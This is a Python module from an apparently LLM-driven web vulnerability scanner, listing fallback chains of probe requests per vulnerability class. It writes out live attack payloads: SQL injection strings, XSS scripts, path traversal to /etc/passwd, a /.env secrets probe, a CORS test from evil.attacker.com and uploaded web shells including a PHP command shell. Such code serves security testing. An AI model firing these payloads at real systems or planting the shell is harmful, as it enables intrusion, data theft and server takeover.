"""Technique library with fallback chains per vulnerability category.

Inspired by production experience with model-fallback patterns: instead of trying one generic
probe, each vulnerability category has an ordered chain of increasingly
specific techniques. When the LLM fails to generate a valid plan, the agent
iterates through this chain.

Each technique specifies:
  - method: HTTP method
  - path_pattern: URL path template (may include {base_path} placeholder)
  - payload: Request body or query string
  - headers: Extra headers
  - expected_indicators: What to look for in the response
  - description: Human-readable explanation
"""

from dataclasses import dataclass, field


@dataclass(frozen=True)
class Technique:
    """A single verification technique for a vulnerability category."""

    description: str
    method: str
    path_pattern: str
    headers: dict[str, str] = field(default_factory=dict)
    payload: str = ""
    expected_indicators: list[str] = field(default_factory=list)
    is_multipart: bool = False
    filename: str = ""


# --- SQL Injection fallback chain ---
SQL_INJECTION_CHAIN: list[Technique] = [
    Technique(
        description="Classic single-quote SQL injection on login",
        method="POST",
        path_pattern="/api/auth/login",
        headers={"Content-Type": "application/json"},
        payload='{"username":"admin\' OR 1=1 --","password":"test"}',
        expected_indicators=["SQL", "syntax", "error", "mysql", "postgres"],
    ),
    Technique(
        description="Union-based SQL injection on search",
        method="GET",
        path_pattern="/api/search?q=' UNION SELECT NULL,NULL,NULL--",
        expected_indicators=["SQL", "syntax", "UNION", "column"],
    ),
    Technique(
        description="Time-based blind SQL injection on GraphQL",
        method="POST",
        path_pattern="/graphql",
        headers={"Content-Type": "application/json"},
        payload='{"query":"{ user(id: \\"1\\\' AND SLEEP(5)--\\") { id } }"}',
        expected_indicators=["error", "syntax"],
    ),
    Technique(
        description="Error-based injection on user endpoint",
        method="GET",
        path_pattern="/api/users/1%27",
        expected_indicators=["SQL", "syntax", "error", "near"],
    ),
]

# --- XSS fallback chain ---
XSS_CHAIN: list[Technique] = [
    Technique(
        description="Reflected XSS via search parameter",
        method="GET",
        path_pattern="/search?q=<script>alert(1)</script>",
        payload="<script>alert(1)</script>",
        expected_indicators=["<script>", "alert("],
    ),
    Technique(
        description="XSS via onerror event handler",
        method="GET",
        path_pattern='/search?q=<img src=x onerror="alert(1)">',
        payload='<img src=x onerror="alert(1)">',
        expected_indicators=["onerror=", "<img"],
    ),
    Technique(
        description="XSS via SVG onload",
        method="POST",
        path_pattern="/api/comments",
        headers={"Content-Type": "application/json"},
        payload='{"body":"<svg/onload=alert(1)>"}',
        expected_indicators=["<svg", "onload"],
    ),
]

# --- Path Traversal fallback chain ---
PATH_TRAVERSAL_CHAIN: list[Technique] = [
    Technique(
        description="Directory traversal to /etc/passwd",
        method="GET",
        path_pattern="/api/files?path=../../etc/passwd",
        expected_indicators=["root:x:", "/bin/bash"],
    ),
    Technique(
        description="Encoded traversal to /etc/passwd",
        method="GET",
        path_pattern="/api/files?path=%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        expected_indicators=["root:x:", "/bin/bash"],
    ),
    Technique(
        description="Double-encoded traversal",
        method="GET",
        path_pattern="/api/download?file=....//....//etc/passwd",
        expected_indicators=["root:x:", "/bin/bash"],
    ),
]

# --- File Upload (CWE-434) fallback chain ---
FILE_UPLOAD_CHAIN: list[Technique] = [
    Technique(
        description="Upload PHP web shell to /api/upload",
        method="POST",
        path_pattern="/api/upload",
        payload="<?php echo 'VULTURE_UPLOAD_TEST'; ?>",
        expected_indicators=["upload", "file", "path", "url", "success"],
        is_multipart=True,
        filename="shell.php",
    ),
    Technique(
        description="Upload JSP shell to /upload",
        method="POST",
        path_pattern="/upload",
        payload='<% out.println("VULTURE_UPLOAD_TEST"); %>',
        expected_indicators=["upload", "file", "path"],
        is_multipart=True,
        filename="test.jsp",
    ),
    Technique(
        description="Upload ASPX shell to /api/files",
        method="POST",
        path_pattern="/api/files",
        payload='<%@ Page Language="C#" %><% Response.Write("VULTURE"); %>',
        expected_indicators=["file", "path", "url"],
        is_multipart=True,
        filename="payload.aspx",
    ),
    Technique(
        description="Upload HTML file to /api/media",
        method="POST",
        path_pattern="/api/media",
        payload="<script>alert('VULTURE_UPLOAD_TEST')</script>",
        expected_indicators=["upload", "media", "path"],
        is_multipart=True,
        filename="script.html",
    ),
    Technique(
        description="Upload PHP with image/jpeg content-type",
        method="POST",
        path_pattern="/api/attachments",
        payload="<?php system($_GET['cmd']); ?>",
        expected_indicators=["file", "attach", "path"],
        is_multipart=True,
        filename="avatar.php",
    ),
]

# --- Authentication Bypass fallback chain ---
AUTH_BYPASS_CHAIN: list[Technique] = [
    Technique(
        description="Access admin panel without credentials",
        method="GET",
        path_pattern="/admin",
        expected_indicators=["dashboard", "admin", "settings", "panel"],
    ),
    Technique(
        description="Access user profile without auth token",
        method="GET",
        path_pattern="/api/users/me",
        headers={"Accept": "application/json"},
        expected_indicators=["email", "name", "user", "profile"],
    ),
    Technique(
        description="Access settings without auth",
        method="GET",
        path_pattern="/api/settings",
        headers={"Accept": "application/json"},
        expected_indicators=["config", "settings", "preferences"],
    ),
    Technique(
        description="Access dashboard without auth",
        method="GET",
        path_pattern="/dashboard",
        expected_indicators=["dashboard", "overview", "stats"],
    ),
]

# --- Information Disclosure fallback chain ---
INFO_DISCLOSURE_CHAIN: list[Technique] = [
    Technique(
        description="Check for debug/status endpoint",
        method="GET",
        path_pattern="/api/status",
        expected_indicators=["version", "debug", "config", "env"],
    ),
    Technique(
        description="Check for environment variable exposure",
        method="GET",
        path_pattern="/.env",
        expected_indicators=["API_KEY", "SECRET", "PASSWORD", "DATABASE"],
    ),
    Technique(
        description="Check for stack trace on error",
        method="GET",
        path_pattern="/api/nonexistent-endpoint-12345",
        expected_indicators=["Traceback", "stack", "at ", "File "],
    ),
    Technique(
        description="Check for phpinfo exposure",
        method="GET",
        path_pattern="/phpinfo.php",
        expected_indicators=["phpinfo", "PHP Version", "System"],
    ),
]

# --- Security Header fallback chain ---
SECURITY_HEADERS_CHAIN: list[Technique] = [
    Technique(
        description="Check main page for security headers",
        method="GET",
        path_pattern="/",
        expected_indicators=[
            "strict-transport-security",
            "x-frame-options",
            "content-security-policy",
        ],
    ),
    Technique(
        description="Check API root for security headers",
        method="GET",
        path_pattern="/api",
        expected_indicators=[
            "strict-transport-security",
            "x-content-type-options",
        ],
    ),
]

# --- Cookie Security fallback chain ---
COOKIE_SECURITY_CHAIN: list[Technique] = [
    Technique(
        description="Check login for cookie security flags",
        method="POST",
        path_pattern="/api/auth/login",
        headers={"Content-Type": "application/json"},
        payload='{"username":"test","password":"test"}',
        expected_indicators=["Set-Cookie", "Secure", "HttpOnly", "SameSite"],
    ),
    Technique(
        description="Check session endpoint for cookie flags",
        method="GET",
        path_pattern="/api/auth/session",
        expected_indicators=["Set-Cookie", "session"],
    ),
]

# --- CORS Misconfiguration fallback chain ---
CORS_CHAIN: list[Technique] = [
    Technique(
        description="Test CORS with malicious origin",
        method="OPTIONS",
        path_pattern="/api/users",
        headers={
            "Origin": "https://evil.attacker.com",
            "Access-Control-Request-Method": "POST",
        },
        expected_indicators=["access-control-allow-origin"],
    ),
    Technique(
        description="Test CORS on GraphQL endpoint",
        method="OPTIONS",
        path_pattern="/graphql",
        headers={
            "Origin": "https://evil.attacker.com",
            "Access-Control-Request-Method": "POST",
        },
        expected_indicators=["access-control-allow-origin"],
    ),
]

# --- CSRF fallback chain ---
CSRF_CHAIN: list[Technique] = [
    Technique(
        description="POST to password change without CSRF token",
        method="POST",
        path_pattern="/api/users/password",
        headers={"Content-Type": "application/json"},
        payload='{"old_password":"test","new_password":"hacked"}',
        expected_indicators=["csrf", "token", "forbidden"],
    ),
    Technique(
        description="POST to settings without CSRF token",
        method="POST",
        path_pattern="/api/settings",
        headers={"Content-Type": "application/json"},
        payload='{"key":"value"}',
        expected_indicators=["csrf", "token"],
    ),
]


# --- Category → Chain mapping ---

def _normalize_category(title: str, category: str) -> str:
    """Map finding title/category to a technique chain key."""
    lower_title = title.lower()
    lower_cat = category.lower()

    if any(kw in lower_title for kw in ("injection", "sqli", "sql ")):
        return "sql_injection"
    if any(kw in lower_title for kw in ("xss", "cross-site scripting", "cross site")):
        return "xss"
    if any(kw in lower_title for kw in ("traversal", "path", "lfi", "directory")):
        return "path_traversal"
    if any(kw in lower_title for kw in (
        "upload", "file upload", "unrestricted", "cwe-434",
        "file type", "file extension",
    )) or "434" in lower_cat:
        return "file_upload"
    if any(kw in lower_title for kw in (
        "auth", "login", "access control", "bypass", "unauthenticated",
        "unauthorized", "privilege",
    )):
        return "auth_bypass"
    if any(kw in lower_title for kw in (
        "disclosure", "leak", "expos", "hardcod", "credential", "secret",
        "debug", "verbose", "stack trace", "error handling",
    )):
        return "info_disclosure"
    if any(kw in lower_title for kw in (
        "header", "hsts", "x-frame", "csp", "content-security",
        "x-content-type", "clickjack", "transport",
    )):
        return "security_headers"
    if any(kw in lower_title for kw in ("cookie", "session")):
        return "cookie_security"
    if any(kw in lower_title for kw in ("cors", "cross-origin")):
        return "cors"
    if any(kw in lower_title for kw in ("csrf", "cross-site request")):
        return "csrf"
    return "generic"


_CHAIN_MAP: dict[str, list[Technique]] = {
    "sql_injection": SQL_INJECTION_CHAIN,
    "xss": XSS_CHAIN,
    "path_traversal": PATH_TRAVERSAL_CHAIN,
    "file_upload": FILE_UPLOAD_CHAIN,
    "auth_bypass": AUTH_BYPASS_CHAIN,
    "info_disclosure": INFO_DISCLOSURE_CHAIN,
    "security_headers": SECURITY_HEADERS_CHAIN,
    "cookie_security": COOKIE_SECURITY_CHAIN,
    "cors": CORS_CHAIN,
    "csrf": CSRF_CHAIN,
}


def get_technique_chain(
    finding_title: str,
    finding_category: str,
) -> list[Technique]:
    """Get the ordered technique chain for a finding's vulnerability type."""
    key = _normalize_category(finding_title, finding_category)
    return _CHAIN_MAP.get(key, [])


def pick_next_technique(
    finding_title: str,
    finding_category: str,
    tried_paths: set[str],
) -> Technique | None:
    """Pick the next untried technique from the chain.

    Returns None when all techniques in the chain have been exhausted.
    """
    chain = get_technique_chain(finding_title, finding_category)
    for technique in chain:
        if technique.path_pattern not in tried_paths:
            return technique
    return None
